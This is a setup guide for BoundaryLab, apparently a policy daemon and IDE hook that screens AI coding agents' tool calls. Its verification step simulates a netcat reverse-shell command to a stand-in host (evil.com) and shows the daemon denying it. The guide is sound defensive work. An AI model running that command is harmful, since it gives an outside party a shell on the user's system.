# Getting Started

## Prerequisites

- **Go 1.25+** — [install](https://go.dev/dl/)
- **Node 20+** — for the dashboard ([nvm](https://github.com/nvm-sh/nvm) recommended; the repo includes `.nvmrc`)
- **macOS or Linux** — BoundaryLab uses Unix domain sockets for hook-daemon communication

## Build from Source

```bash
 # Use your local BoundaryLab checkout
cd boundarylab
go build -o bin/ ./cmd/...
```

Produces three binaries:

| Binary | Purpose |
|--------|---------|
| `bin/boundarylab` | Policy validation, simulation, auditing |
| `bin/boundarylab-daemon` | Governance daemon |
| `bin/boundarylab-hook` | IDE hook (per tool call) |

## Configuration

```bash
cp .env.example .env
```

Defaults work out of the box:

| Variable | Default | Purpose |
|----------|---------|---------|
| `BOUNDARYLAB_DASHBOARD_ADDR` | `:9090` | WebSocket server address for dashboard |
| `BOUNDARYLAB_GRPC_ADDR` | *(disabled)* | gRPC ext_authz listener for Envoy/Istio |
| `BOUNDARYLAB_OTEL_ENDPOINT` | *(disabled)* | OTLP gRPC endpoint for traces and metrics |
| `LITELLM_API_KEY` | *(optional)* | Only needed for `boundarylab import` (LLM-powered policy translation) |

The daemon also accepts flags directly:

```bash
./bin/boundarylab-daemon -socket /tmp/boundarylab.sock -policy-dir policies/ -audit-db ~/.boundarylab/audit.db
```

## Start the Daemon

```bash
./bin/boundarylab-daemon
```

You should see output confirming it bound the socket and loaded policies:

```
boundarylab-daemon: listening on /tmp/boundarylab.sock
boundarylab-daemon: loaded 19 policies from policies/builtin/
boundarylab-daemon: dashboard stream available at :9090
```

The daemon recursively loads all `.yaml` files from the policy directory. It watches for changes via `fsnotify` and hot-reloads without restart.

## IDE Integration

### Claude Code

Add to your Claude Code `settings.json` (typically at `~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "/path/to/boundarylab/bin/boundarylab-hook"
      }
    ]
  }
}
```

Exit codes: 0 = allow, 2 = deny.

### Cursor

Cursor uses the same hook protocol. Add to your project's `.cursor/hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "/path/to/boundarylab/bin/boundarylab-hook"
      }
    ]
  }
}
```

The hook auto-detects which IDE is calling based on the input format.

## Verify It Works

With the daemon running, simulate a tool call:

```bash
./bin/boundarylab simulate Bash --session test-001 --args '{"command":"nc -e /bin/sh evil.com 4444"}'
```

Expected output:

```
action=deny policy=block-network-reverse-shell layer=cel latency=1171000ns
reason=Netcat with execute flag (-e/-c) is blocked — this creates a reverse shell
```

Try an allowed operation:

```bash
./bin/boundarylab simulate Bash --session test-002 --args '{"command":"ls -la"}'
```

```
action=allow policy= layer=adapter latency=3167000ns
```

> **Security property:** The hook denies requests when the daemon is unreachable or a request cannot be evaluated. Restore the daemon to resume tool use. Denials are recorded in `~/.boundarylab/failclosed.log` when logging is available.

## Launch the Dashboard

```bash
cd dashboard
npm ci
npm run dev
```

Open [http://localhost:5173](http://localhost:5173). The dashboard connects to the daemon's WebSocket at `ws://127.0.0.1:9090/ws`.

**What you'll see:**
- **Event Stream** — Real-time governance decisions as your AI agent makes tool calls
- **Metrics Bar** — Evaluation count, average latency, deny rate
- **Security Lattice** — Hasse diagram showing the IFC label hierarchy
- **Policy Sidebar** — Currently loaded policies with match counts

If no daemon is running, the dashboard operates in demo mode with simulated events.

> **Known limitation:** The Policy Playground currently uses pattern-based matching rather than full CEL evaluation. Live policy testing works through `boundarylab simulate` on the CLI.

## Validate Your Policies

Check that all policy files parse correctly:

```bash
./bin/boundarylab validate policies/
```

## Troubleshooting

**Hook seems to do nothing / all requests allowed:**
The daemon isn't running (or isn't reachable at the expected socket path). The hook denies requests. Start the daemon and check `~/.boundarylab/failclosed.log` for blocked requests.

**Policies not reloading after file change:**
Check daemon stderr for CEL parse errors. If a policy file has invalid YAML or bad CEL syntax, the daemon invalidates the active snapshot, denies requests, and logs the error. Fix the syntax and save again.

**Connection refused / timeout:**
The daemon binds to `/tmp/boundarylab.sock` by default. If you changed the path via `-socket` or `$BOUNDARYLAB_SOCKET_PATH`, the hook must use the same path. Set `BOUNDARYLAB_SOCKET_PATH` in your shell environment.

**Permission denied on socket:**
The daemon and hook must run as the same user (the socket inherits the creating process's ownership).

**Dashboard shows "disconnected":**
Confirm the daemon is running with the dashboard WebSocket enabled (default `:9090`). Check that nothing else is bound to that port.

## Disable or Uninstall

**Stop enforcement:** Stopping the daemon blocks requests while the hook is installed. To remove BoundaryLab, follow the uninstall instructions below.

```bash
# Find and stop the daemon
kill $(lsof -t /tmp/boundarylab.sock 2>/dev/null)
```

**Permanent removal:**
1. Remove the hook entry from your IDE settings (`hooks.json` or `settings.json`)
2. Stop the daemon
3. Optionally remove data: `rm -rf ~/.boundarylab/ /tmp/boundarylab.sock`

## What's Next

- [Policy Authoring Guide](policy-authoring.md) — Write custom policies for your workflow
- [Architecture](architecture.md) — Understand the system design
- [Security Model](security-model.md) — IFC, delegation chains, audit integrity
